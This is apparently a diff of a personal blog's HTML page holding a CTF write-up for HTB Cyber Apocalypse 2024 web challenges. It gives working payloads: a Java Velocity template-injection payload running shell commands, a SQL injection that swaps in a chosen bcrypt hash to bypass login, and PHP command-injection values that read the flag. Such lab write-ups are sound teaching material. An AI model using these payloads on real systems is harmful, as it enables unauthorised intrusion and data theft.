+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    run()
+</span></span></code></pre></div><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web1.png?raw=true" alt=""></p>
 <p>We can the proceed, to edit the payload earlier, from <code>(&quot;ls&quot;, &quot;/&quot;)</code> to <code>(&quot;cat&quot;, &quot;/flagd410c24b47.txt&quot;)</code>, and rerun the solver.</p>
 <p><em><strong>FLAG: <code>HTB{w34kly_t35t3d_t3mplate5}</code></strong></em>
 <br/>
@@ -417,18 +422,18 @@ newTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#3
 <br/></p>
 <h1 id="labyrinth-linguist">Labyrinth Linguist</h1>
 <p>This vulnerable part of the code will allow us to replace the <code>TEXT</code> on the template file index.html, which can be used to perform SSTI injection on Java Velocity.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">bufferedReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileReader<span style="color:#f92672">(</span>filePath<span style="color:#f92672">));</span>
-String line<span style="color:#f92672">;</span>
-            
-<span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>line <span style="color:#f92672">=</span> bufferedReader<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;TEXT&#34;</span><span style="color:#f92672">,</span> replacement<span style="color:#f92672">);</span>
-    content<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>line<span style="color:#f92672">);</span>
-    content<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><p>However, we need to slightly modify the payload from the widely available (from HackTricks) payload for Java Velocity</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>bufferedReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader(<span style="color:#66d9ef">new</span> FileReader(filePath));
+</span></span><span style="display:flex;"><span>String line;
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ((line <span style="color:#f92672">=</span> bufferedReader.<span style="color:#a6e22e">readLine</span>()) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;TEXT&#34;</span>, replacement);
+</span></span><span style="display:flex;"><span>    content.<span style="color:#a6e22e">append</span>(line);
+</span></span><span style="display:flex;"><span>    content.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>However, we need to slightly modify the payload from the widely available (from HackTricks) payload for Java Velocity</p>
 <p>payload for <code>text</code></p>
-<pre tabindex="0"><code>#set($e=&quot;e&quot;)
-#set($ex=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;ls /&quot;));
+<pre tabindex="0"><code>#set($e=&#34;e&#34;)
+#set($ex=$e.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;ls /&#34;));
 $ex.waitFor();
 #set($out=$ex.getInputStream());
 #foreach($i in [1..$out.available()])
@@ -466,15 +471,15 @@ var
 <br/></p>
 <h1 id="korp-terminal">KORP Terminal</h1>
 <p>We need to use SQL injection on the username field to inject our own hash in which we know the plaintext. We need to make the overall SQL query to become like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> password <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">#</span>this will <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">none</span>
-<span style="color:#66d9ef">UNION</span>
-<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&#34;</span><span style="color:#75715e">-- &#39; #this will return a hash that we can control
-</span></code></pre></div><p>Clue from Challenge Description: <code>The terminal login screen is protected by state-of-the-art encryption and security protocols.</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> password <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">#</span>this will <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">none</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&#34;</span><span style="color:#75715e">-- &#39; #this will return a hash that we can control
+</span></span></span></code></pre></div><p>Clue from Challenge Description: <code>The terminal login screen is protected by state-of-the-art encryption and security protocols.</code>
 bcrypt is commonly used for login, so we can try hashing using bcrypt. If the hash type chosen is incorrect, the server should return <code>invalid salt</code>.</p>
 <p>Crafting bcrypt hash using password plaintext: <code>fidethus</code>
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web3.png?raw=true" alt=""></p>
 <p><strong>payload</strong></p>
-<pre tabindex="0"><code>username=' UNION SELECT &quot;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&quot;-- &amp;password=fidethus
+<pre tabindex="0"><code>username=&#39; UNION SELECT &#34;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&#34;-- &amp;password=fidethus
 </code></pre><p><em><strong>FLAG: <code>HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}</code></strong></em>
 <br/>
 <br/>
@@ -482,22 +487,22 @@ bcrypt is commonly used for login, so we can try hashing using bcrypt. If the ha
 <h1 id="timekorp">TimeKORP</h1>
 <p>Vulnerable part of the source code, concatenating user input directly to <code>exec()</code> without sanitization
 PHP Command Injection:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TimeModel</span>
-{
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($format)
-    {
-        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;date &#39;+&#34;</span> <span style="color:#f92672">.</span> $format <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; 2&gt;&amp;1&#34;</span>;
-    }
-
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTime</span>()
-    {
-        $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span>);
-        $res  <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($time) <span style="color:#f92672">?</span> $time <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;?&#39;</span>;
-        <span style="color:#66d9ef">return</span> $res;
-    }
-}
-</code></pre></div><p><code>?format=';dir'</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TimeModel</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($format)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;date &#39;+&#34;</span> <span style="color:#f92672">.</span> $format <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; 2&gt;&amp;1&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTime</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span>);
+</span></span><span style="display:flex;"><span>        $res  <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($time) <span style="color:#f92672">?</span> $time <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;?&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $res;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>?format=';dir'</code>
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web4.png?raw=true" alt=""></p>
 <br/>
 <p><code>?format=';cat ../flag</code>
@@ -517,42 +522,41 @@ Content-Length: 637
 Connection: close
 
 {
-  &quot;allPossibleCommands&quot;: {
-    &quot;1&quot;: [
-      &quot;HEAD NORTH&quot;,
-      &quot;HEAD WEST&quot;,
-      &quot;HEAD EAST&quot;,
-      &quot;HEAD SOUTH&quot;
+  &#34;allPossibleCommands&#34;: {
+    &#34;1&#34;: [
+      &#34;HEAD NORTH&#34;,
+      &#34;HEAD WEST&#34;,
+      &#34;HEAD EAST&#34;,
+      &#34;HEAD SOUTH&#34;
     ],
-    &quot;2&quot;: [
-      &quot;GO DEEPER INTO THE FOREST&quot;,
-      &quot;FOLLOW A MYSTERIOUS PATH&quot;,
-      &quot;CLIMB A TREE&quot;,
-      &quot;TURN BACK&quot;
+    &#34;2&#34;: [
+      &#34;GO DEEPER INTO THE FOREST&#34;,
+      &#34;FOLLOW A MYSTERIOUS PATH&#34;,
+      &#34;CLIMB A TREE&#34;,
+      &#34;TURN BACK&#34;
     ],
-    &quot;3&quot;: [
-      &quot;EXPLORE A CAVE&quot;,
-      &quot;CROSS A RICKETY BRIDGE&quot;,
-      &quot;FOLLOW A GLOWING BUTTERFLY&quot;,
-      &quot;SET UP CAMP&quot;
+    &#34;3&#34;: [
+      &#34;EXPLORE A CAVE&#34;,
+      &#34;CROSS A RICKETY BRIDGE&#34;,
+      &#34;FOLLOW A GLOWING BUTTERFLY&#34;,
+      &#34;SET UP CAMP&#34;
     ],
-    &quot;4&quot;: [
-      &quot;ENTER A MAGICAL PORTAL&quot;,
-      &quot;SWIM ACROSS A MYSTERIOUS LAKE&quot;,
-      &quot;FOLLOW A SINGING SQUIRREL&quot;,
-      &quot;BUILD A RAFT AND SAIL DOWNSTREAM&quot;
+    &#34;4&#34;: [
+      &#34;ENTER A MAGICAL PORTAL&#34;,
+      &#34;SWIM ACROSS A MYSTERIOUS LAKE&#34;,
+      &#34;FOLLOW A SINGING SQUIRREL&#34;,
+      &#34;BUILD A RAFT AND SAIL DOWNSTREAM&#34;
     ],
-    &quot;secret&quot;: [
-      &quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot;
+    &#34;secret&#34;: [
+      &#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;
     ]
   }
 }
-
 </code></pre><p>Pay attention to this part:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">    <span style="color:#e6db74">&#34;secret&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
-      <span style="color:#e6db74">&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;</span>
-    ]
-</code></pre></div><p>Crafted POST Request to get flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;secret&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span></code></pre></div><p>Crafted POST Request to get flag.</p>
 <pre tabindex="0"><code>POST /api/monitor HTTP/1.1
 Host: 94.237.62.48:39111
 Content-Length: 68
@@ -565,7 +569,7 @@ Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 Connection: close
 
-{&quot;command&quot;:&quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot;}
+{&#34;command&#34;:&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;}
 </code></pre><p><em><strong>FLAG: `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}</strong></em>
 <br/>
 <br/>
@@ -618,7 +622,7 @@ Connection: close
 >
   <div class="mr-auto">
     &copy; 2024
-    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
+    <a class="link" href="https://berliangabriel.github.io/">Berlian Gabriel</a>
   </div>
   <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
     >Powered by Hugo️️</a
